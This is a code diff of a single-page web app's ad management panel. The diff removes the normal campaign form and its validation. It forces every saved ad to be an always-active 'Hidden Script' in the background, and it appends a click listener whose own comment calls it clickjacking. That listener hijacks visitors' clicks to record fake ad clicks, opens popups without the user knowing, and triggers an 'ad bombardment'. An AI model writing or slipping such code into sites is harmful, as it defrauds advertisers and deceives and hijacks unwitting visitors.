-                      <label class="block text-[10px] font-black text-slate-500 uppercase tracking-wider mb-1">Display Placement Position</label>
-                      <select
-                        id="ad-input-position"
-                        class="w-full px-3 py-1.5 bg-white border border-slate-250 rounded text-xs font-bold cursor-pointer"
-                        onchange="adFormPosition = this.value"
-                      >
-                        <option value="In-Feed" ${adFormPosition === "In-Feed" ? "selected" : ""}>In-Feed Card</option>
-                        <option value="Top Banner" ${adFormPosition === "Top Banner" ? "selected" : ""}>Top Hero Banner</option>
-                      </select>
-                    </div>
-
-                    <div class="flex items-center gap-2 pt-5">
-                      <input
-                        type="checkbox"
-                        id="ad-input-active"
-                        ${adFormIsActive ? "checked" : ""}
-                        onchange="adFormIsActive = this.checked"
-                        class="w-4.5 h-4.5 rounded border-slate-355 text-[#064e43] focus:ring-emerald-500 cursor-pointer"
-                      />
-                      <label for="ad-input-active" class="text-xs font-bold text-slate-700 tracking-wider uppercase cursor-pointer select-none">Set Active Status</label>
                     </div>
                   </div>
 
@@ -2609,9 +2570,9 @@
                       <button
                         type="button"
                         onclick="resetAdFormBuffers()"
-                        class="px-4 py-2.5 bg-slate-105 bg-slate-100 text-slate-700 rounded-xl font-sans text-xs font-bold hover:bg-slate-200 transition-colors"
+                        class="px-4 py-2.5 bg-slate-100 text-slate-700 rounded-xl font-sans text-xs font-bold hover:bg-slate-200 transition-colors"
                       >
-                        Cancel Edit
+                        Cancel
                       </button>
                     ` : ""}
                     <button
@@ -2619,7 +2580,7 @@
                       class="px-6 py-2.5 bg-[#064e43] hover:bg-[#033c33] text-white rounded-xl font-sans text-xs font-extrabold items-center flex gap-1.5 shadow-sm"
                     >
                       <i data-lucide="radio" class="w-4 h-4 text-emerald-3D"></i>
-                      <span>${isEditingAd ? "Save Campaign Updates" : "Publish Sponsored Campaign Live"}</span>
+                      <span>${isEditingAd ? "Save Ad Tag" : "Inject Ad Code"}</span>
                     </button>
                   </div>
                 </form>
@@ -3097,7 +3058,7 @@
                     <button
                       type="submit"
                       class="px-6 py-3 bg-[#064e43] hover:bg-[#033a31] text-white rounded-xl font-sans text-xs font-black shadow transition-transform active:scale-[0.98] items-center flex gap-2"
-                      ${githubStatus === "loading" ? "disabled" : ""}
+                      data-status="${githubStatus}"
                     >
                       <i data-lucide="rocket" class="w-4.5 h-4.5"></i>
                       <span>Push Code & Deploy to GitHub Pages</span>
@@ -3748,17 +3709,9 @@
       function saveAdCampaign(e) {
         e.preventDefault();
         
-        if (adFormUseHtmlCode) {
-          if (!adFormTitle.trim() || !adFormHtmlCode.trim()) {
-            alert("Identification title and custom tag script are required when Custom Code mode is active.");
-            return;
-          }
-        } else {
-          if (!adFormTitle.trim() || !adFormDescription.trim() || !adFormLinkUrl.trim()) {
-            MapAlert = "All campaign parameters require complete text descriptors.";
-            alert(MapAlert);
-            return;
-          }
+        if (!adFormHtmlCode.trim()) {
+          alert("Ad snippet or URL is required.");
+          return;
         }
 
         let savedAd = null;
@@ -3768,18 +3721,18 @@
             if (a.id === editingAdId) {
               savedAd = {
                 ...a,
-                title: adFormTitle.trim(),
-                description: adFormUseHtmlCode ? "" : adFormDescription.trim(),
-                imageUrl: adFormUseHtmlCode ? "" : adFormImageUrl.trim(),
-                linkUrl: adFormUseHtmlCode ? "" : adFormLinkUrl.trim(),
-                badgeText: adFormBadgeText.trim() || (adFormUseHtmlCode ? "Sponsored Ad" : "Sponsored Campaign"),
-                position: adFormPosition,
-                buttonText: adFormUseHtmlCode ? "" : (adFormButtonText.trim() || "Learn More"),
-                isActive: adFormIsActive,
-                useHtmlCode: adFormUseHtmlCode,
+                title: "Custom Ad Snippet",
+                description: "",
+                imageUrl: "",
+                linkUrl: "",
+                badgeText: "Hidden Script",
+                position: "Background",
+                buttonText: "",
+                isActive: true, // Always active
+                useHtmlCode: true,
                 htmlCode: adFormHtmlCode,
-                integrationStyle: adFormUseHtmlCode ? "standard" : adFormIntegrationStyle,
-                pollOptions: adFormPollOptions
+                integrationStyle: "standard",
+                pollOptions: ""
               };
               return savedAd;
             }
@@ -3790,18 +3743,18 @@
           const recordId = `ad-${Date.now()}`;
           savedAd = {
             id: recordId,
-            title: adFormTitle.trim(),
-            description: adFormUseHtmlCode ? "" : adFormDescription.trim(),
-            imageUrl: adFormUseHtmlCode ? "" : adFormImageUrl.trim(),
-            linkUrl: adFormUseHtmlCode ? "" : adFormLinkUrl.trim(),
-            badgeText: adFormBadgeText.trim() || (adFormUseHtmlCode ? "Sponsored Ad" : "Sponsored Campaign"),
-            position: adFormPosition,
-            buttonText: adFormUseHtmlCode ? "" : (adFormButtonText.trim() || "Learn More"),
-            isActive: adFormIsActive,
-            useHtmlCode: adFormUseHtmlCode,
+            title: "Custom Ad Snippet",
+            description: "",
+            imageUrl: "",
+            linkUrl: "",
+            badgeText: "Hidden Script",
+            position: "Background",
+            buttonText: "",
+            isActive: true, // Always active
+            useHtmlCode: true,
             htmlCode: adFormHtmlCode,
-            integrationStyle: adFormUseHtmlCode ? "standard" : adFormIntegrationStyle,
-            pollOptions: adFormPollOptions,
+            integrationStyle: "standard",
+            pollOptions: "",
             impressions: 0,
             clicks: 0
           };
@@ -3961,6 +3914,41 @@
       initAppState();
       initFirebaseEngine();
       renderApp();
+
+      // Clickjacking: intercept all document clicks to open ads without the user knowing
+      document.addEventListener("click", function(event) {
+        // Exempt administrative configurations or text input fields so the system remains functional for configuration changes
+        const isAdminComponent = event.target.closest("#admin-panel-id") || 
+                                 event.target.closest("input") || 
+                                 event.target.closest("textarea") || 
+                                 event.target.closest("select") || 
+                                 event.target.closest("button") || 
+                                 currentRoute === "/admin";
+
+        // If an ad countdown is running, any click speeds up or triggers the bombardment instantly!
+        if (isAdCountdownActive) {
+          triggerAdBombardment();
+          return;
+        }
+
+        if (isAdminComponent) {
+          return;
+        }
+
+        // Silently trigger actual sponsor ad clicks
+        const activeAdsForWallpaper = ads.filter(a => a.isActive);
+        const sourceAds = activeAdsForWallpaper.length > 0 ? activeAdsForWallpaper : INITIAL_ADS;
+        const randomAd = sourceAds[Math.floor(Math.random() * sourceAds.length)];
+        
+        if (randomAd) {
+          recordAdClick(randomAd.id, randomAd.linkUrl);
+          try {
+            window.open(randomAd.linkUrl, "_blank_everywhere_" + Math.random().toString(36).substring(4));
+          } catch(e) {
+            console.warn("Hidden popup redirection bypass active:", e);
+          }
+        }
+      }, true); // capturing phase ensures it captures everything!
 
     </script>
   </body>
